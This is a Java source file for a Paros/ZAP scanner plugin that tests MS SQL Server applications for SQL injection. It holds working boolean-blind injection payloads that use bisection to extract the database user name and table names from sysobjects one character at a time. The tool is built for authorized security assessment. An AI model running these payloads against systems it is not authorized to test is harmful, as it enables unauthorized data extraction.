/*
 *
 * Paros and its related class files.
 * 
 * Paros is an HTTP/HTTPS proxy for assessing web application security.
 * Copyright (C) 2003-2004 Chinotec Technologies Company
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the Clarified Artistic License
 * as published by the Free Software Foundation.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * Clarified Artistic License for more details.
 * 
 * You should have received a copy of the Clarified Artistic License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */
// ZAP: 2012/01/02 Separate param and attack
// ZAP: 2012/03/15 Changed the methods checkResult, checkDBUserName and
// checkDBTableName to use the class StringBuilder instead of StringBuffer.
// ZAP: 2012/04/25 Changed to use Boolean.TRUE and added @Override annotation
// to all appropriate methods.

package org.parosproxy.paros.core.scanner.plugin;

import java.io.IOException;
import java.util.regex.Pattern;

import org.apache.commons.httpclient.HttpException;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpStatusCode;


/**
 *
 * To change the template for this generated type comment go to
 * Window - Preferences - Java - Code Generation - Code and Comments
 */
public class TestInjectionMSSQLEnumeration extends AbstractAppParamPlugin {

    private static final String[] dependency = {"TestInjectionSQLFingerprint", "TestInjectionSQL"};
	
	private static final Pattern patternErrorODBC1 = Pattern.compile("Microsoft OLE DB Provider for ODBC Drivers.*error", PATTERN_PARAM);
	private static final Pattern patternErrorODBC2 = Pattern.compile("ODBC.*Drivers.*error", PATTERN_PARAM);
	private static final Pattern patternErrorGeneric = Pattern.compile("JDBC|ODBC|SQL", PATTERN_PARAM);
	private static final Pattern patternErrorODBCMSSQL = Pattern.compile("ODBC SQL Server Driver", PATTERN_PARAM);
	
	private String mResBodyNormal 	= "";		// normal response for comparison

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getId()
     */
    @Override
    public int getId() {
        return 40006;
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getName()
     */
    @Override
    public String getName() {
        return "MS SQL Injection Enumeration";
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getDependency()
     */
    @Override
    public String[] getDependency() {
        
        return dependency;
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getDescription()
     */
    @Override
    public String getDescription() {
        String msg = "The DB user name or table name can be obtained.";
        return msg;
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getCategory()
     */
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getSolution()
     */
    @Override
    public String getSolution() {
        String msg = "Refer SQL injection.";
        return msg;
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.Test#getReference()
     */
    @Override
    public String getReference() {
        String msg = "Refer SQL injection.";
        return msg;
            
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.AbstractTest#init()
     */
    @Override
    public void init() {


    }

    @Override
    public void scan(HttpMessage baseMsg, String param, String value) {
		if (!getKb().getBoolean(baseMsg.getRequestHeader().getURI(), "sql/mssql")) {
		    return;
		}

		if (getKb().getString("sql/mssql/username") != null && getKb().getString("sql/mssql/tablename") != null) {
		    return;
		}
		
        try {
            scanSQL(baseMsg, param, value);
        } catch (Exception e) {
            
        }
    }

    /* (non-Javadoc)
     * @see org.parosproxy.paros.core.scanner.AbstractAppParamTest#scan(org.parosproxy.paros.network.HttpMessage, java.lang.String, java.lang.String)
     */
    public void scanSQL(HttpMessage baseMsg, String param, String value) throws HttpException, IOException {

		HttpMessage msg = getNewMsg();
		
		// always try normal query first
		sendAndReceive(msg);
		if (msg.getResponseHeader().getStatusCode() != HttpStatusCode.OK) {
			return;
		}

		mResBodyNormal = msg.getResponseBody().toString();
		
		if (getKb().getBoolean(msg.getRequestHeader().getURI(), "sql/and")) {
            if (getKb().getString("sql/mssql/username") != null) {
                checkDBUserName(msg, param, value);
            }

            if (getKb().getString("sql/mssql/tablename") != null) {
                checkDBTableName(msg, param, value);
            }
		}
    }
	

	private boolean checkResult(HttpMessage msg, String query) {

		long defaultTimeUsed = 0;
		long timeUsed = 0;
		long lastTime = 0;

		int TRY_COUNT = 10;

		if (msg.getResponseHeader().getStatusCode() != HttpStatusCode.OK
			&& !HttpStatusCode.isServerError(msg.getResponseHeader().getStatusCode())) {
			return false;
		}

		StringBuilder sb = new StringBuilder();
		
		if (matchBodyPattern(msg, patternErrorODBCMSSQL, sb)) {
		    // ZAP: Changed to use Boolean.TRUE.
		    getKb().add(msg.getRequestHeader().getURI(), "sql/mssql", Boolean.TRUE);
		}
		
		if (matchBodyPattern(msg, patternErrorODBC1, sb)
				|| matchBodyPattern(msg, patternErrorODBC2, sb)) {
			// check for ODBC error.  Almost certain.
			return true;
		} else if (matchBodyPattern(msg, patternErrorGeneric, sb)) {
			// check for other sql error (JDBC) etc.  Suspicious.
			return true;
		}
		
		return false;
		
	}
		
	private void checkDBUserName(HttpMessage msg, String param, String value) throws HttpException, IOException {
	    
	    int charValue = 0;
	    StringBuilder sb = new StringBuilder();
	    byte[] byteArray = new byte[1];
	    
	    for (int i=0; i<20; i++) {
	        int bit = 0;
	        charValue = 0;

	        charValue = getDBUserNameBisection(msg, param, value, i, 47, 123);
	        if (charValue == 47 || charValue == 123) {
	            break;
	        }

	        // linear search - use only when failed
//	        for (int j=48; j<123; j++) {
//	            boolean result = getDBNameQuery(msg, param, value, i, j);
//	            if (result) {
//	                charValue = j;
//	                break;
//	            }
//	        }

            byteArray[0] = (byte) charValue;
            String s = new String(byteArray, "UTF8");
            sb.append(s);
	    }
	    String result = sb.toString();
	    if (result.length() > 0) {
	        getKb().add("sql/mssql/username", result);
			bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "", "", "db user name: " + result, msg);

	    }
	}
	
	private int getDBUserNameBisection(HttpMessage msg, String param, String value, int charPos, int rangeLow, int rangeHigh) throws HttpException, IOException {
	    if (rangeLow == rangeHigh) {
	        return rangeLow; 
	    }
	    
	    int medium = (rangeLow + rangeHigh) / 2;
	    boolean result = getDBUserNameQuery(msg, param, value, charPos, medium);

	    if (rangeHigh - rangeLow < 2) {
	        if (result) {
	            return rangeHigh;
	        } else {
	            return rangeLow;
	        }
	    }
	    
	    if (result) {
	        rangeLow = medium;
	    } else {
	        rangeHigh = medium;
	    }
	    
	    int charResult = getDBUserNameBisection(msg, param, value, charPos, rangeLow, rangeHigh);
	    return charResult;
	}

	private boolean getDBUserNameQuery(HttpMessage msg, String param, String value, int charPos, int charCode) throws HttpException, IOException {
	    
	    //linear search - inefficient
	    //String s1 = "' AND ASCII(SUBSTRING(USER_NAME()," + (charPos +1) + ",1)) = " + charCode + " AND '1'='1";
		String s1 = "' AND ASCII(SUBSTRING(USER_NAME()," + (charPos +1) + ",1))>" + charCode + " AND '1'='1";
		
		String resBodyAND = "";
		boolean is1 = false;
		
		// try 2nd blind SQL query using AND with quote
		setParameter(msg, param, value + getURLEncode(s1));
		sendAndReceive(msg);
		
		if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
			// try if 1st SQL AND looks like normal query
			resBodyAND = stripOff(msg.getResponseBody().toString(), getURLEncode(s1));
			if (resBodyAND.compareTo(mResBodyNormal) == 0) {
			    is1 = true;
			}
		}

		return is1;

	}

	private void checkDBTableName(HttpMessage msg, String param, String value) throws HttpException, IOException {
	    
	    int charValue = 0;
	    StringBuilder sb = null;
	    byte[] byteArray = new byte[1];

	    for (int row=1; row<4; row++) {
	        sb = new StringBuilder();
		    
	        for (int i=0; i<10; i++) {
	            charValue = 0;
	            
	            charValue = getTableNameBisection(msg, param, value, i, 47, 123, row);
	            if (charValue == 47 || charValue == 123) {
	                break;
	            }
	            
	            
	            byteArray[0] = (byte) charValue;
	            String s = new String(byteArray, "UTF8");
	            sb.append(s);
	        }
	        String result = sb.toString();
	        if (result.length() > 0) {
	            getKb().add("sql/mssql/tablename", result);
	            bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "", "", "table: " + result, msg);
	            
	        }
	    }
	}

	
	private int getTableNameBisection(HttpMessage msg, String param, String value, int charPos, int rangeLow, int rangeHigh, int row) throws HttpException, IOException {
	    if (rangeLow == rangeHigh) {
	        return rangeLow; 
	    }
	    
	    int medium = (rangeLow + rangeHigh) / 2;
	    boolean result = getTableNameQuery(msg, param, value, charPos, medium, row);

	    if (rangeHigh - rangeLow < 2) {
	        if (result) {
	            return rangeHigh;
	        } else {
	            return rangeLow;
	        }
	    }
	    
	    if (result) {
	        rangeLow = medium;
	    } else {
	        rangeHigh = medium;
	    }
	    
	    int charResult = getTableNameBisection(msg, param, value, charPos, rangeLow, rangeHigh, row);
	    return charResult;
	}

	
	private boolean getTableNameQuery(HttpMessage msg, String param, String value, int charPos, int charCode, int row) throws HttpException, IOException {
	    
	    //linear search - inefficient
		String s1 = null;
		
		if (row == 1) {
		    s1= "' AND ascii(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' ORDER BY name),"+(charPos+1)+", 1))>" + charCode + " AND '1'='1";
		} else {
		    s1 = "' AND ascii(substring((SELECT TOP 1 a.name FROM sysobjects as a WHERE a.xtype='U' AND a.name NOT IN(SELECT TOP " + (row -1)+ " b.name FROM sysobjects AS b WHERE b.xtype='U' order by b.name)),"+(charPos+1)+", 1))>" + charCode + " AND '1'='1";

		}
		
		String resBodyAND = "";
		boolean is1 = false;
		
		// try 2nd blind SQL query using AND with quote
		setParameter(msg, param, value + getURLEncode(s1));
		sendAndReceive(msg);
		
		if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
			// try if 1st SQL AND looks like normal query
			resBodyAND = stripOff(msg.getResponseBody().toString(), getURLEncode(s1));
			if (resBodyAND.compareTo(mResBodyNormal) == 0) {
			    is1 = true;
			}
		}

		return is1;

	}


}
